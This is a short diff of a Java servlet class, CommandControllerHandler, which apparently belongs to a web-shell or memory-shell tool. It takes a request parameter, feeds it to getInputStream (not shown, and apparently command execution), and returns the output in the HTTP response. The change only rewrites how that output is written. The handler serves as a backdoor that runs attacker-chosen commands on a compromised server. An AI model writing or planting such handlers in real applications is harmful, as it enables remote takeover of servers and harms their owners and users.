@@ -7,6 +7,7 @@ import javax.servlet.ServletOutputStream;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.InputStream;
+import java.util.Scanner;
 
 /**
  * @author ReaJason
@@ -24,12 +25,9 @@ public class CommandControllerHandler implements Controller {
             if (p != null) {
                 String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
-                ServletOutputStream outputStream = response.getOutputStream();
-                byte[] buf = new byte[8192];
-                int length;
-                while ((length = inputStream.read(buf)) != -1) {
-                    outputStream.write(buf, 0, length);
-                }
+                response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
+                response.getWriter().flush();
+                response.getWriter().close();
             }
         } catch (Throwable e) {
             e.printStackTrace();
